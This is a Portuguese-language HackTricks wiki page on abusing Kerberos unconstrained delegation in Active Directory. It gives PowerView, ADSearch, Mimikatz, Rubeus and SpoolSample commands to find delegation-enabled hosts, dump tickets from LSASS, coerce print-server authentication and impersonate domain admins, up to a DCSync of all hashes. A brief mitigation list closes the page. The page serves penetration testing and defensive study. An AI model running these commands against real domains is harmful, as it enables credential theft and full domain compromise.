# Delegação Irrestrita

<details>

<summary><strong>Aprenda hacking na AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Você trabalha em uma **empresa de cibersegurança**? Gostaria de ver sua **empresa anunciada no HackTricks**? ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [repositório hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Delegação Irrestrita

Esta é uma funcionalidade que um Administrador de Domínio pode configurar em qualquer **Computador** dentro do domínio. Então, toda vez que um **usuário fizer login** no Computador, uma **cópia do TGT** desse usuário será **enviada dentro do TGS** fornecido pelo DC **e salva na memória no LSASS**. Portanto, se você tiver privilégios de Administrador na máquina, poderá **despejar os tickets e se passar pelos usuários** em qualquer máquina.

Portanto, se um administrador de domínio fizer login em um Computador com a funcionalidade de "Delegação Irrestrita" ativada, e você tiver privilégios de administrador local dentro dessa máquina, você poderá despejar o ticket e se passar pelo Administrador de Domínio em qualquer lugar (escalada de privilégios de domínio).

Você pode **encontrar objetos de Computador com esse atributo** verificando se o atributo [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx) contém [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx). Você pode fazer isso com um filtro LDAP de ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, que é o que o powerview faz:

<pre class="language-bash"><code class="lang-bash"># Listar computadores sem restrições
## Powerview
Get-NetComputer -Unconstrained #DCs sempre aparecem, mas não são úteis para escalada de privilégios
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Exportar tickets com Mimikatz
</strong>privilege::debug
sekurlsa::tickets /export #Forma recomendada
kerberos::list /export #Outra forma

# Monitorar logins e exportar novos tickets
.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Verificar a cada 10s por novos TGTs</code></pre>

Carregue o ticket do Administrador (ou usuário vítima) na memória com **Mimikatz** ou **Rubeus para um** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Mais informações: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Mais informações sobre Delegação Irrestrita em ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Forçar Autenticação**

Se um atacante for capaz de **comprometer um computador permitido para "Delegação Irrestrita"**, ele poderia **enganar** um **servidor de impressão** para **fazer login automaticamente** nele **salvando um TGT** na memória do servidor.\
Em seguida, o atacante poderia realizar um **ataque Pass the Ticket para se passar** pela conta de computador do servidor de impressão.

Para fazer um servidor de impressão fazer login em qualquer máquina, você pode usar [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Se o TGT for de um controlador de domínio, você pode realizar um ataque **DCSync** e obter todos os hashes do DC.\
[**Mais informações sobre esse ataque em ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**Aqui estão outras maneiras de tentar forçar uma autenticação:**

{% content-ref url="printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
{% endcontent-ref %}

### Mitigação

* Limitar logins de DA/Admin para serviços específicos
* Definir "A conta é sensível e não pode ser delegada" para contas privilegiadas.
